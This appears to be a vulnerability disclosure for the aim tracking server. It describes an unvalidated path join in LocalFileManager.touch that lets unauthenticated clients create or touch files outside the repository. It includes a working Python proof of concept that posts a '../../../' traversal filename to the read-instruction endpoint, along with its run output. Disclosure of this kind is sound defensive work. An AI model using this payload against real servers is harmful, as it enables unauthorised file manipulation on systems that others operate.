## Description

`LocalFileManager.touch(filename)` in `aim/sdk/reporter/file_manager.py`:

```python
new_path = self.base_dir / filename      # base_dir = <repo>/.aim/check_ins
new_path.touch(exist_ok=True)
```

`filename` arrives from the remote `read-instruction` call and is joined without normalization or containment validation, so `../` segments escape the repository root. `LocalFileManager` is registered as a remotely obtainable resource (`get_file_manager` in `aim/ext/transport/handlers.py`).

## Impact (low severity, real boundary)

An unauthenticated network client of the tracking server can create empty files (or bump mtimes of existing files) at any server-writable relative location — e.g. pre-place filenames that later logic writes to, or refresh stale markers whose freshness is mtime-based. It only creates/touches files; it does not write content or overwrite existing file contents.

## PoC

Verified against aim v3.29.1 with a real `aim server --repo <mount>`; the attack escapes three levels up from `check_ins` to outside the whole repository directory:

```python
args = pack_args(encode_tree(("../../../escaped_marker.txt",)))
requests.post(f"{BASE}/read-instruction/",
              json={"resource_handler": fm_handler, "method_name": "touch",
                    "args": base64.b64encode(args).decode()})
# fm_handler obtained via get-resource with resource_type="FileManager"

**Verification: DYNAMICALLY-REPRODUCED** (PoC executed in WSL2; output from real run)
```

## Execution result

```
[attacker] touch('../../../escaped_marker.txt') -> HTTP 200
[evidence] file created outside repo root: True (/home/iot/aim_repro4/escaped_marker.txt)
[RESULT] {"poc": "aim-04-touch-traversal", "verdict": "REPRODUCED",
          "escaped_marker": "/home/iot/aim_repro4/escaped_marker.txt",
          "created_outside_repo": true}
```

The marker file appeared outside the repository root (repo lived at `/home/iot/aim_repro4/repo`), confirming the unvalidated join.
